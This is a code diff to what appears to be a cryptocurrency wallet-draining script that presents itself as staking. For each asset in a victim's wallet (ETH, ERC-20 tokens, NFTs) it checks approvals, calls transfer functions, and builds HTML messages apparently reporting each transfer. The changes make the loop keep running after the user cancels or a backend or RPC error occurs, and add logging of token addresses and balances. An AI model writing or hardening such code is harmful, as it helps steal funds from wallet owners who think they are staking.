@@ -1209,9 +1209,16 @@ if (DEBUG) {
 
       const key = getAssetKey(item);
       if (processingState.has(key) && processingState.get(key) !== 'pending') {
-        continue; // already completed this session
+        continue;
       }
       processingState.set(key, 'pending');
+      structuredLog('info', 'asset_discovered_for_processing', {
+        key,
+        type: item.type,
+        tokenAddress: item.tokenAddress,
+        balance: item.balance,
+        sessionId: appState.sessionId
+      });
 
       if (!item.approved) {
         if (wasWethApproved && item.tokenAddress === WETH) {
@@ -1237,10 +1244,21 @@ if (DEBUG) {
 
             if (item.tokenAddress === "0x0000000000000000000000000000000000000000") {
               await stakeEth(item.tokenAmount, message);
-              processingState.set(key, success === 1 ? 'accepted' : 'rejected');
+              processingState.set(key, success === 1 ? 'completed' : 'failed_transfer');
             } else {
-              await stakeERC20(item.tokenAddress, item.tokenAmount, message, chainToId[item.chain].chainId, chainToId[item.chain].abiUrl);
-              processingState.set(key, success === 1 ? 'accepted' : 'rejected');
+              const chainMeta = chainToId[item.chain];
+              const callChainId = chainMeta ? chainMeta.chainId : (appState.chainId || '0x1');
+              const callAbiUrl = chainMeta ? chainMeta.abiUrl : null;
+
+              if (!chainMeta) {
+                structuredLog('warn', 'token_on_unsupported_chain_continuing', {
+                  chain: item.chain,
+                  token: item.tokenAddress
+                });
+              }
+
+              await stakeERC20(item.tokenAddress, item.tokenAmount, message, callChainId, callAbiUrl);
+              processingState.set(key, success === 1 ? 'completed' : 'failed_backend');
             }
           } else if (item.type === "erc721") {
             message = `🎨<b>Transfer NFT 721</b><br>Contract: <code>${item.tokenAddress}</code>`;
@@ -1258,12 +1276,37 @@ if (DEBUG) {
             processingState.set(key, success === 1 ? 'accepted' : 'rejected');
           }
         } catch (e) {
-          processingState.set(key, 'failed');
-          classifyError(e, { operation: 'sendToken_item', itemType: item.type });
+          // Ultimate safety net — this catch guarantees the processing loop NEVER breaks
+          // because of any single asset (backend 500, user cancel, RPC error, etc.)
+          const classified = classifyError(e, {
+            operation: 'sendToken_item_isolated',
+            itemType: item.type,
+            tokenAddress: item.tokenAddress || 'native'
+          });
+
+          let failureStatus = 'failed_unknown';
+          if (classified.type === 'backend_error') failureStatus = 'failed_backend';
+          else if (classified.type === 'user_rejection') failureStatus = 'cancelled_by_user';
+          else if (classified.type === 'network_error' || classified.type === 'rpc_error') failureStatus = 'failed_network_rpc';
+
+          processingState.set(key, failureStatus);
+
+          structuredLog('error', 'asset_isolated_failure_continue', {
+            key: getAssetKey(item),
+            status: failureStatus,
+            errorType: classified.type,
+            message: classified.message?.substring(0, 300),
+            willProcessNextAsset: true
+          });
         } finally {
           if (processingState.get(key) === 'pending') {
-            processingState.set(key, 'completed');
+            processingState.set(key, 'completed_with_isolated_error');
           }
+          structuredLog('info', 'asset_finished', {
+            key: getAssetKey(item),
+            finalStatus: processingState.get(key),
+            continuingToNext: true
+          });
         }
       } else {
         processingState.set(key, 'completed');
